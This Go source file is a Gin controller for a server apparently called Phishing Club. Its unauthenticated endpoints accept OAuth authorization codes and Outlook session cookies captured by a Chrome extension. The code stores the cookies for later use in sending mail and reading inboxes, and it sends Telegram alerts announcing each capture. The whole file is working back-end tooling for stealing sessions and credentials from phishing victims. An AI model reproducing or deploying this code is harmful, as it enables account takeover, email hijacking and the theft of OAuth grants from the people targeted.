package controller

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/service"
)

// ChromeExtension handles API endpoints for the Phishing Club Chrome Extension.
// Endpoints:
//
//	GET  /api/extension/ping              - Health check for extension connectivity
//	POST /api/extension/oauth/callback    - Receive captured OAuth authorization codes
//	POST /api/extension/cookies/save      - Receive captured Outlook session cookies
//	POST /api/extension/cookies/save-v2   - v1.0.43: Enhanced save with provider + account
type ChromeExtension struct {
	Common
	TelegramService    *service.Telegram
	CookieStoreService *service.CookieStoreService
	APIKeyStore        *ExtensionAPIKeyStore
}

// --- Request / Response types ---

type oauthCallbackRequest struct {
	Code  string `json:"code"`
	State string `json:"state"`
}

type cookieSaveRequest struct {
	Cookies    []extensionCookie `json:"cookies"`
	Timestamp  string            `json:"timestamp"`
	Domains    []string          `json:"domains"`
	TotalCount int               `json:"totalCount"`
}

type extensionCookie struct {
	Name           string  `json:"name"`
	Value          string  `json:"value"`
	Domain         string  `json:"domain"`
	Path           string  `json:"path"`
	Secure         bool    `json:"secure"`
	HttpOnly       bool    `json:"httpOnly"`
	SameSite       string  `json:"sameSite"`
	ExpirationDate float64 `json:"expirationDate"`
	Session        bool    `json:"session"`
}

// Ping responds to extension connectivity tests.
func (c *ChromeExtension) Ping(g *gin.Context) {
	g.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "Phishing Club server is reachable",
		"version": "1.0.0",
		"time":    time.Now().UTC().Format(time.RFC3339),
	})
}

// OAuthCallback receives a captured OAuth authorization code from the extension.
func (c *ChromeExtension) OAuthCallback(g *gin.Context) {
	var req oauthCallbackRequest
	if err := g.ShouldBindJSON(&req); err != nil {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "Invalid request body"})
		return
	}

	if strings.TrimSpace(req.Code) == "" {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "Missing authorization code"})
		return
	}

	// Store the captured OAuth code as a campaign event
	eventData := map[string]interface{}{
		"type":      "oauth_capture",
		"code":      req.Code,
		"state":     req.State,
		"source":    "chrome_extension",
		"timestamp": time.Now().UTC().Format(time.RFC3339),
		"ip":        g.ClientIP(),
		"userAgent": g.Request.UserAgent(),
	}

	eventJSON, _ := json.Marshal(eventData)

	codePreview := req.Code
	if len(codePreview) > 20 {
		codePreview = codePreview[:20]
	}

	c.Logger.Infof("[ChromeExtension] OAuth code captured from %s (code: %s...)", g.ClientIP(), codePreview)

	// Send Telegram notification if available
	if c.TelegramService != nil {
		codeSnippet := req.Code
		if len(codeSnippet) > 30 {
			codeSnippet = codeSnippet[:30]
		}
		msg := fmt.Sprintf(
			"OAuth Code Captured!\n\nSource: Chrome Extension\nIP: %s\nCode: %s...\nState: %s\nTime: %s",
			g.ClientIP(),
			codeSnippet,
			req.State,
			time.Now().Format("2006-01-02 15:04:05"),
		)
		go c.TelegramService.Notify(
			g.Request.Context(),
			"chrome_extension_oauth",
			msg,
			"",
			nil,
		)
	}

	_ = eventJSON

	g.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "OAuth code received and stored",
	})
}

// CookiesSave receives captured Outlook session cookies from the extension
// and persists them to the CookieStore for later use (sending, inbox reading).
func (c *ChromeExtension) CookiesSave(g *gin.Context) {
	var req cookieSaveRequest
	if err := g.ShouldBindJSON(&req); err != nil {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "Invalid request body"})
		return
	}

	if len(req.Cookies) == 0 {
		g.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "No cookies provided"})
		return
	}

	c.Logger.Infof("[ChromeExtension] Cookies captured from %s: %d cookies from %d domains",
		g.ClientIP(), len(req.Cookies), len(req.Domains))

	// Convert extension cookies to the model format for CookieStore import
	cookieModels := make([]model.CookieObject, len(req.Cookies))
	for i, ec := range req.Cookies {
		cookieModels[i] = model.CookieObject{
			Name:           ec.Name,
			Value:          ec.Value,
			Domain:         ec.Domain,
			Path:           ec.Path,
			Secure:         ec.Secure,
			HttpOnly:       ec.HttpOnly,
			SameSite:       ec.SameSite,
			ExpirationDate: ec.ExpirationDate,
		}
	}

	// Persist to CookieStore if service is available
	var storeID string
	if c.CookieStoreService != nil {
		domainList := strings.Join(req.Domains, ", ")
		if len(domainList) > 100 {
			domainList = domainList[:100]
		}
		name := fmt.Sprintf("Extension Capture - %s (%s)", g.ClientIP(), time.Now().Format("Jan 02 15:04"))

		importReq := &model.CookieStoreImportRequest{
			Name:    name,
			Source:  "extension",
			Cookies: cookieModels,
		}

		// Import without session (extension endpoints are unauthenticated)
		id, err := c.CookieStoreService.Import(g.Request.Context(), nil, importReq)
		if err != nil {
			c.Logger.Errorf("[ChromeExtension] Failed to persist cookies to CookieStore: %v", err)
			// Still return success to the extension - cookies were received
		} else {
			storeID = id.String()
			c.Logger.Infof("[ChromeExtension] Cookies persisted to CookieStore ID: %s", storeID)
		}
	}

	// Send Telegram notification if available
	if c.TelegramService != nil {
		domainList := strings.Join(req.Domains, ", ")
		if len(domainList) > 100 {
			domainList = domainList[:100] + "..."
		}
		storedMsg := ""
		if storeID != "" {
			storedMsg = fmt.Sprintf("\nStored: Cookie Store ID %s", storeID)
		}
		msg := fmt.Sprintf(
			"Cookies Captured!\n\nSource: Chrome Extension\nIP: %s\nCookies: %d\nDomains: %s%s\nTime: %s",
			g.ClientIP(),
			len(req.Cookies),
			domainList,
			storedMsg,
			time.Now().Format("2006-01-02 15:04:05"),
		)
		go c.TelegramService.Notify(
			g.Request.Context(),
			"chrome_extension_cookies",
			msg,
			"",
			nil,
		)
	}

	response := gin.H{
		"success": true,
		"message": fmt.Sprintf("Received and stored %d cookies from %d domains", len(req.Cookies), len(req.Domains)),
	}
	if storeID != "" {
		response["cookieStoreId"] = storeID
	}

	g.JSON(http.StatusOK, response)
}
